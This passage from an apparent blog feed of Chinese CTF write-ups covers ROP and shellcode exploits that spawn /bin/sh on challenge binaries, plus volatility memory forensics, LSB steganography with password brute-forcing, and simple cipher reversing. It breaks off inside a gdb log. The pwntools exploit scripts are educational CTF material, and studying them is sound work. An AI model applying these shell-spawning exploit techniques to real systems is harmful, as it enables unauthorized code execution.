        <content type="html"><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="three"><a href="#three" class="headerlink" title="three"></a>three</h3><p>IDA打开之后，函数名都是<code>sub_xxx</code>，然后通过nc官方部署的程序（或本地在程序所在目录创建flag文件后），获得程序中会出现的字符串定位到了重要函数，我用的是字符串<code>Maybe is good</code>。</p><p>贴出来一下重要函数对应的内存地址：</p><table><thead><tr><th>函数名（已重命名）</th><th>内存地址</th></tr></thead><tbody><tr><td>main</td><td>0x08048CA8</td></tr><tr><td>load_flag</td><td>0x080488C5</td></tr><tr><td>Maybe_is_good</td><td>0x0804897E</td></tr><tr><td>main_method</td><td>0x08048B5C</td></tr></tbody></table><p>四者结构如图：</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191112231835.png" alt="四者结构"></p><p><code>load_flag</code>里面需要加载flag文件，如果没有就exit，也就是一开始无法本地打开原因。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191112232013.png"></p><p>Maybe_is_good 里面没有特别的，关键在main_method，先贴出完整代码（以重名部分函数&amp;注释）</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191112232152.png"></p><p>gdb调试：’very much’ 后输入 ‘aaa’，’tell me’ 后输入 ‘bbbbbbbbbbb······’。可以看到eax被写入了’aaa’，ecx被写入了’bbbbbbbbbbbbbbbbbbb····’</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191112232844.png"></p><p>然后就是第22行代码，看不懂就查汇编，对应的汇编是<code>call eax</code>。就是当eax是函数来调用。结合前面的eax会被覆写为输入值，就可以进行<strong>ROP</strong>。</p><p>攻击大致流程如下：</p><ol><li>eax被覆写为payload1</li><li>写入payload2</li><li>call eax</li><li>int80_call</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">elf = ELF(&amp;<span class="comment">#039;./pwn&amp;#039;)</span></span><br><span class="line"><span class="comment"># &amp;#039;ldd ./pwn&amp;#039; get libc.so</span></span><br><span class="line"><span class="comment"># libc = ELF(&amp;#039;./libc-2.27.so&amp;#039;)</span></span><br><span class="line">libc = ELF(&amp;<span class="comment">#039;/lib/x86_64-linux-gnu/libc.so.6&amp;#039;)</span></span><br><span class="line"></span><br><span class="line">sh = process(&amp;<span class="comment">#039;./pwn&amp;#039;)</span></span><br><span class="line">sh.sendlineafter(&amp;<span class="comment">#039;index:\n&amp;#039;, str(0)) # 0&amp;lt;=x&amp;lt;=31</span></span><br><span class="line"></span><br><span class="line">payload = asm(&amp;<span class="comment">#039;&amp;#039;&amp;#039;</span></span><br><span class="line">xchg ecx, esp</span><br><span class="line">ret</span><br><span class="line">&amp;<span class="comment">#039;&amp;#039;&amp;#039;,arch = &amp;#039;i386&amp;#039;)</span></span><br><span class="line">sh.sendafter(&amp;<span class="comment">#039; much!\n&amp;#039;, payload)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&amp;<span class="comment">#039;size:\n&amp;#039;, str(512)) # 0&amp;lt;=x&amp;lt;=512,x&amp;gt;payload</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROPgadget</span></span><br><span class="line">layout = [</span><br><span class="line">    <span class="number">0x08072fb1</span>, <span class="comment">#: pop edx; pop ecx; pop ebx; ret; </span></span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="number">0x80f6d40</span>, <span class="comment"># &amp;#039;/bin/sh\0&amp;#039; address</span></span><br><span class="line">    <span class="number">0x080c11e6</span>, <span class="comment">#: pop eax; ret; </span></span><br><span class="line">    <span class="number">11</span>, <span class="comment"># len &amp;#039;/bin/sh\0&amp;#039;</span></span><br><span class="line">    <span class="number">0x080738c0</span>, <span class="comment">#: int 0x80; ret; </span></span><br><span class="line">]</span><br><span class="line">sh.sendafter(&amp;<span class="comment">#039;me:\n&amp;#039;, flat(layout).ljust(0x80, &amp;#039;\0&amp;#039;) + &amp;#039;/bin/sh\0&amp;#039;)</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p><strong>EXP解释</strong></p><ul><li>13、21行两个数值可在注释范围内调整</li><li>payload是交换ecx、esp两个寄存器的值</li><li>layout里面是gadget，向int_80传参</li><li>int_80的作用类似于system，具体看这里<ul><li><a href="https://blog.csdn.net/fivedoumi/article/details/53184797">https://blog.csdn.net/fivedoumi/article/details/53184797</a></li><li><a href="https://blog.csdn.net/maowenl/article/details/32309683">https://blog.csdn.net/maowenl/article/details/32309683</a></li><li><a href="https://www.cnblogs.com/caesarxu/p/3261232.html">https://www.cnblogs.com/caesarxu/p/3261232.html</a></li></ul></li></ul><p>最后：官方wp解法是交换ecx、esp的内容之后，利用返回值是<code>1</code>还是<code>2</code>，来逐个字节爆破得出flag。</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Advertising-for-Marriage"><a href="#Advertising-for-Marriage" class="headerlink" title="Advertising for Marriage"></a>Advertising for Marriage</h3><p>内存取证题目。题目给出的是raw文件，这个文件不是图片的那个raw。。。初次之外内存取证还有<strong>dmg</strong>文件。利用的分析工具最主要是<code>volatility</code>。</p><p>首先查看镜像信息：<code>volatility -f Advertising\ for\ Marriage.raw imageinfo</code></p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191115194954.png"></p><p>使用 <code>WinXPSP2x86</code> 预设。然后就是查进程：<code>volatility -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86 pslist</code></p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191115195158.png"></p><p>存在记事本进程，查一查有什么：<code>volatility -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86 notepad</code></p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191115195319.png"></p><p>提示：<code>hint:????needmoneyandgirlfirend</code></p><p>扫描所有png文件：<code>volatility  -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86 filescan|grep png</code></p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191115195554.png"></p><p>找到一张 <code>png</code> 图片：<code>vegetable.png</code>。导出图片：<code>volatility  -f Advertising\ for\ Marriage.raw --profile=WinXPSP2x86 dumpfiles -D . -Q 0x000000000249ae78</code></p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191115195756.png"></p><p>图片无法显示，报错：<code>IHDR: CRC ERROR</code>。</p><p>估计图片尺寸被修改了。</p><p>用脚本计算图片实际长度和宽度，并且生成修复后的图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">img = <span class="built_in">open</span>(&amp;quot;vegetable.png&amp;quot;, &amp;quot;rb&amp;quot;).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">        data = img[<span class="number">0xc</span>:<span class="number">0x10</span>] + struct.pack(&amp;<span class="comment">#039;&amp;gt;i&amp;#039;,w) + struct.pack(&amp;#039;&amp;gt;i&amp;#039;,h) + img[0x18:0x1d]</span></span><br><span class="line">        crc32 = binascii.crc32(data) &amp;amp; <span class="number">0xffffffff</span></span><br><span class="line">        <span class="keyword">if</span> crc32 == struct.unpack(&amp;<span class="comment">#039;&amp;gt;i&amp;#039;,img[0x1d:0x21])[0] &amp;amp; 0xffffffff:</span></span><br><span class="line">            <span class="built_in">print</span> w, h</span><br><span class="line">            <span class="built_in">print</span> <span class="built_in">hex</span>(w), <span class="built_in">hex</span>(h)</span><br><span class="line">            <span class="built_in">open</span>(&amp;quot;vegetable_new.png&amp;quot;, &amp;quot;wb&amp;quot;).write(img[:<span class="number">0xc</span>] + data + img[<span class="number">0x1d</span>:])</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>用 <code>Stegsolve</code> 查看图片，找到模糊的 <code>flag</code>，一般情况较难恢复。同时，也发现 <code>lsb</code> 有点东西。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191116000941.png"></p><p>解密需要密钥，密钥为上面记事本找到的提示：<code>????needmoneyandgirlfirend</code>，需要魔改工具爆破前 4 字节。</p><p>爆破得到密钥 <code>b1cxneedmoneyandgirlfirend</code>，这里给出自己写的破解脚本，需要把<code>lsb加密库</code>clone <a href="https://github.com/livz/cloacked-pixel">下载</a>，然后把脚本丢里面运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># creat password</span></span><br><span class="line">password = []</span><br><span class="line">pd_element =  <span class="built_in">list</span>(string.ascii_letters) + <span class="built_in">list</span>(string.digits)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pd_element:</span><br><span class="line"><span class="keyword">if</span> i != &amp;<span class="comment">#039;b&amp;#039;:</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> pd_element:</span><br><span class="line"><span class="comment">#if j != &amp;#039;1&amp;#039;:</span></span><br><span class="line"><span class="comment">#continue</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> pd_element:</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> pd_element:</span><br><span class="line">password.append(i+j+k+m+&amp;quot;needmoneyandgirlfirend&amp;quot;)</span><br><span class="line"><span class="comment">#pd = i+j+k+m+&amp;quot;needmoneyandgirlfirend&amp;quot;</span></span><br><span class="line"><span class="comment">#print &amp;quot;password = %s &amp;quot; %pd</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">file_name = &amp;<span class="comment">#039;2.png&amp;#039; # 解密的图片</span></span><br><span class="line">out_file_1 = &amp;<span class="comment">#039;out.txt&amp;#039; # lsb中间文件</span></span><br><span class="line">out_file_2 = &amp;<span class="comment">#039;result.txt&amp;#039; # result结果记录文件</span></span><br><span class="line"><span class="keyword">for</span> pd <span class="keyword">in</span> password:</span><br><span class="line">out_data_2= <span class="built_in">open</span>(out_file_2,&amp;<span class="comment">#039;a&amp;#039;)</span></span><br><span class="line">pd = &amp;<span class="comment">#039;b1cxneedmoneyandgirlfirend&amp;#039;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span> &amp;quot;total <span class="keyword">try</span> &#123;&#125; times\ntrying: &#123;&#125;&amp;quot;.<span class="built_in">format</span>(n,pd)</span><br><span class="line">argv = r&amp;<span class="comment">#039;python lsb.py extract &amp;#039; + file_name  + &amp;#039; &amp;#039; + out_file_1 + &amp;#039; &amp;#039;+ pd </span></span><br><span class="line">lsb  =  os.popen(argv,&amp;<span class="comment">#039;r&amp;#039;)</span></span><br><span class="line">data = lsb.read()</span><br><span class="line">lsb.close()</span><br><span class="line"><span class="built_in">print</span> &amp;quot;&#123;&#125; SUCCESS&amp;quot;.<span class="built_in">format</span>(pd)</span><br><span class="line">out_data_1 = <span class="built_in">open</span>(out_file_1,&amp;<span class="comment">#039;r&amp;#039;)</span></span><br><span class="line">data = out_data_1.read().strip(&amp;<span class="comment">#039;\n&amp;#039;)</span></span><br><span class="line">out_data_2.write(data+&amp;<span class="comment">#039;\n&amp;#039;)</span></span><br><span class="line">n += <span class="number">1</span></span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="built_in">print</span> &amp;quot;&#123;&#125; ERROR&amp;quot;.<span class="built_in">format</span>(pd)</span><br><span class="line">n += <span class="number">1</span></span><br><span class="line">out_data_2.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解密图片隐写信息，得到字符串：<code>VmlyZ2luaWEgY2lwaGVydGV4dDpnbnh0bXdnN3IxNDE3cHNlZGJzNjI1ODdoMA==</code>。</p><p><code>base64</code> 解码得到：<code>Virginia ciphertext:gnxtmwg7r1417psedbs62587h0</code>。</p><p>然后再使用在线维吉尼亚密码解密：密钥<code>b1cxneedmoneyandgirlfirend</code></p><p>解密得到： <code>flagisd7f1417bfafbf62587e0</code>。</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 红帽杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋CTF答题赛（第三季）WriteUp</title>
      <link href="archives/e0b3d41f/"/>
      <url>archives/e0b3d41f/</url>
      
        <content type="html"><![CDATA[<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="幸运数字"><a href="#幸运数字" class="headerlink" title="幸运数字"></a>幸运数字</h3><p>分析 main 函数得出，只要输入的值经过加密转换之后等于<code>H5wg_2g_MCif_T1ou_v7v7v</code>，就会返回真正 flag 。加密算法只针对字符串中的英文字符。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191129124503.png"></p><p>分析中间加密部分可知，如果密文是大写字母，那么明文也是大写字母；小写字母同理。如果想检验的下面给出加密部分的 c 源码，自己加一个循环上去，看看就知道了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;stdio.h&amp;gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> &amp;lt;cstring&amp;gt;</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a_list[]= &amp;quot;N5cm_2m_SIol_Z1ua_b7b7b&amp;quot;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v5=<span class="built_in">strlen</span>(a_list)+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> v8;</span><br><span class="line"><span class="keyword">char</span> v9;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&amp;lt;=v5<span class="number">-2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">v8 = a_list[i];</span><br><span class="line"><span class="keyword">if</span>(v8&amp;gt;&amp;#<span class="number">039</span>;Z&amp;#<span class="number">039</span>;||v8&amp;lt;&amp;#<span class="number">039</span>;A&amp;#<span class="number">039</span>;)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(v8&amp;gt;&amp;#<span class="number">039</span>;z&amp;#<span class="number">039</span>;||v8&amp;lt;&amp;#<span class="number">039</span>;a&amp;#<span class="number">039</span>;)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">v9 = (v8 - <span class="number">83</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">v9 = (v8 - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line"> &#125; </span><br><span class="line">a_list[i] = v9;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(&amp;quot;%s&amp;quot;,a_list);</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><p>反正明文组合也不多，就爆破之。最终 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">a = &amp;quot;H5wg_2g_MCif_T1ou_v7v7v&amp;quot;</span><br><span class="line">b = &amp;quot;&amp;quot;</span><br><span class="line">ascii_lowercase = string.ascii_lowercase</span><br><span class="line">ascii_uppercase = string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> letter <span class="keyword">in</span> a:</span><br><span class="line">log = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> letter <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line"><span class="keyword">for</span> upper <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">c_upper = (<span class="built_in">ord</span>(upper)-<span class="number">51</span>)%<span class="number">26</span>+<span class="number">65</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">chr</span>(c_upper) == letter:</span><br><span class="line">b += upper</span><br><span class="line">log = <span class="number">1</span></span><br><span class="line">print(&amp;quot;[+]&#123;&#125; <span class="keyword">is</span> find --&amp;gt; &#123;&#125;&amp;quot;.<span class="built_in">format</span>(letter,upper))</span><br><span class="line"><span class="keyword">if</span> letter <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line"><span class="keyword">for</span> lower <span class="keyword">in</span> ascii_lowercase:</span><br><span class="line">c_lower = (<span class="built_in">ord</span>(lower)-<span class="number">83</span>)%<span class="number">26</span>+<span class="number">97</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">chr</span>(c_lower) == letter:</span><br><span class="line">b += lower</span><br><span class="line">log = <span class="number">1</span></span><br><span class="line">print(&amp;quot;[+]&#123;&#125; <span class="keyword">is</span> find --&amp;gt; &#123;&#125;&amp;quot;.<span class="built_in">format</span>(letter,lower))</span><br><span class="line"><span class="keyword">if</span> log == <span class="number">0</span>:</span><br><span class="line">b += letter</span><br><span class="line">print(&amp;quot;[+]&#123;&#125; <span class="keyword">is</span> find.&amp;quot;.<span class="built_in">format</span>(letter))</span><br><span class="line">print(b)</span><br></pre></td></tr></table></figure><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>flag{T5is_2s_YOur_F1ag_h7h7h}</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="word"><a href="#word" class="headerlink" title="word"></a>word</h3><p>密码：cq19</p><p><strong>白给</strong></p><h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><p>flag{obol0dxf-adtr-1vft-p7ng-djulcfsbil3y}</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="md5-brute"><a href="#md5-brute" class="headerlink" title="md5_brute"></a>md5_brute</h3><p>将4个 md5 拿去解密得到flag。</p><p><a href="https://www.cmd5.com/">在线md5解密</a></p><h4 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h4><p>flag{wangwu-2019-1111-9527}</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>差分曼彻斯特编码 + 十六进制转字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msg1 = <span class="number">0x9a9a9a6a9aa9656699a699a566995956996a996aa6a965aa9a6aa596a699665a9aa699655a696569655a9a9a9a595a6965569a59665566955a6965a9596a99aa9a9566a699aa9a969969669aa6969a9559596669</span></span><br><span class="line">s = <span class="built_in">bin</span>(msg1)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span> s</span><br><span class="line">r = &amp;quot;&amp;quot;</span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(s) / <span class="number">2</span>):</span><br><span class="line">    c = s[i * <span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> c == s[i * <span class="number">2</span> - <span class="number">1</span>]:</span><br><span class="line">        r += &amp;<span class="comment">#039;1&amp;#039;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r += &amp;<span class="comment">#039;0&amp;#039;</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(<span class="built_in">int</span>(r, <span class="number">2</span>))[<span class="number">2</span>:-<span class="number">1</span>].decode(&amp;<span class="comment">#039;hex&amp;#039;)</span></span><br></pre></td></tr></table></figure><h4 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h4><p>flag{zw1tt1hl-7zcv-ebfk-akxt-i4xdsxeuv5d3}</p><h3 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a>encrypt</h3><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191201204636.png"></p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191201204704.png"></p><h4 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h4><p>flag{Easy!eAsy!eaSy!}</p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Electrical-System"><a href="#Electrical-System" class="headerlink" title="Electrical System"></a>Electrical System</h3><p>64位，仅有 NX 保护的程序。通过 IDA 分析，在菜单选择列表中，存在着栈溢出的漏洞。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191201200724.png"></p><p>分析源码得出，在输入 ID 时，数据(&amp;buf)将会保存到 .bss 段，输入地址<code>0x6020e0</code>，检查发现这个程序的 .bss 段有可执行权限。</p><p><img src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191201200700.png"></p><p>最终利用思路：输入 ID 时，把 shellcode 输进去。在菜单时，输入<code>Check</code>或者<code>Recharge</code>，避免<code>exit(0)</code>，然后精心构造栈上数据，将 rip 覆写为 .bss 段地址（0x6020e0）。</p><blockquote><p>Q：为什么需要输入输入<code>Check</code>或者<code>Recharge</code>?</p><p>A：覆写的是 menu_brand（0x0000000000400AEE） 返回地址，即完成一次菜单选择才会返回上层的循环(被覆写后则跳转到 .bss 段)，因此需要确保不会触发 menu_brand 的 exit() 函数，所以需要输入一个功能选项。这里为了简单就选 Check 。</p></blockquote><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=&amp;<span class="comment">#039;linux&amp;#039;,arch=&amp;#039;amd64&amp;#039;,log_level=&amp;#039;debug&amp;#039;)</span></span><br><span class="line"><span class="comment">#p = remote(&amp;#039;120.55.43.255&amp;#039;,11002)</span></span><br><span class="line">p = process(&amp;quot;./pwn&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;ID:\n&amp;#039;)</span></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">recharge_addr = <span class="number">0x0000000000400A6F</span></span><br><span class="line">sh_addr = <span class="number">0x00000000006020E0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;choice:\n&amp;#039;)</span></span><br><span class="line">p.sendline(&amp;<span class="comment">#039;Check&amp;#039; + 11 * &amp;#039;a&amp;#039; + p64(sh_addr))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h4><p>flag{8e0ab265-066c-4d9c-8cc4-bd5a425aadae}</p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>pwndbg 的 REGISTERS 查看不知道有没有坑？在栈溢出时，实际上已经覆写了 rip 的值，但是 REGISTERS 显示的是原值。通过查内存(0x7fffffffdd48)，可以证实 rip 已经被覆写了。又或者将 payload 的 .bss 地址修改为 ‘a’*0x8 ，就会报错，然后 gdb 程序并加载生成的 core文件，查询 rip 的值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line">Please enter your choice:</span><br><span class="line">Checkaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000400b5d in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────[ REGISTERS ]─────────────────</span><br><span class="line">RDI  0x7fffffffdd38 ◂— &amp;#039;Checkaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#039;</span><br><span class="line">RSI  0x400ec7 ◂— push   0x6b6365 /* &amp;#039;Check&amp;#039; */</span><br><span class="line">RBP  0x7fffffffdd40 ◂— &amp;#039;aaaaaaaaaaaaaaaaaaaaaaaa&amp;#039;</span><br><span class="line">RIP  0x400b5d ◂— call   0x400a3a</span><br><span class="line">─────────────────[ STACK ]─────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdd30 ◂— 0x0</span><br><span class="line">01:0008│ rdi  0x7fffffffdd38 ◂— &amp;#039;Checkaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#039;</span><br><span class="line">02:0010│ rbp  0x7fffffffdd40 ◂— &amp;#039;aaaaaaaaaaaaaaaaaaaaaaaa&amp;#039;</span><br><span class="line">... ↓</span><br><span class="line">05:0028│      0x7fffffffdd58 ◂— 0x500000000</span><br><span class="line">06:0030│      